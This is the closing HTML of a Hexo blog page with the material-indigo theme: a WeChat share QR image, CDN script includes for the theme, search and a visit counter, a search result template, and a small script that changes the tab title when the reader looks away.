    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACO0lEQVR42u3azW7DIBBF4bz/S7tSV+0CfO5AKzEcVlHixP5YTJifzwev53vxa54fa/7p/FublwwZMo5lPNM1Yszf4QDyO+RbMmTIuIGRBtA0Bs55ZDtenlmGDBkyBmGRB9P04ChDhgwZKwE3TU1rGyRDhgwZtSS2eIPlgLs5F5chQ8aBjLQx8J+v/7C/IUOGjEMYT7hWGpCktVB8KhkyZLRmrNyAtyTT8Fo7ksqQIaM3gx8K+TW10j8Zv9hwtpUhQ8axDH5p2tpMC2fpEVOGDBm9GemxbKWIXxvXQE8lQ4aMaxj8xiS55TX89A9gWDWUIUNGU0YaRne9UwuyqNkpQ4aMdgzyE2mBPh3k4gfB4TbJkCHjAgY5xtVajHyDVop3MmTI6M1IS2xpmsoT1w1pswwZMq5k8KIYH9tKB7yCAC1DhoymjPlDk3GH9WMiD7XDd2TIkHEBoza2RdLatMRWTIllyJBxGYOkrLWmI29h8o2I/wFkyJBxICMNoLsOeelBE22xDBkymjJWbs9LY7x4l/6+DBky7mGk5Xt+XOPHwbSpOTzhypAhox2jNuiQPjQJ9DwQv3RiZciQ0Y7xhCsdm+DfTVPiX5/KkCGjNWM9gay1Fmr/DOkImgwZMjoxSJBNxzKC1mNYBHxpYcqQIaM1gwQ+UvyqpaNLWbgMGTJk4JSVbEFt+BWV52TIkCFj6zV8+DXYFBkyZFzAIElpemM+KLYhuZUhQ0ZrxnoCSVJZsgW8tbChhSlDhowzGF8O/gPx1bC0igAAAABJRU5ErkJggg==" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = '死鬼去哪里了！';
            clearTimeout(titleTime);
        } else {
            document.title = '(つェ⊂)咦!又好了!';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
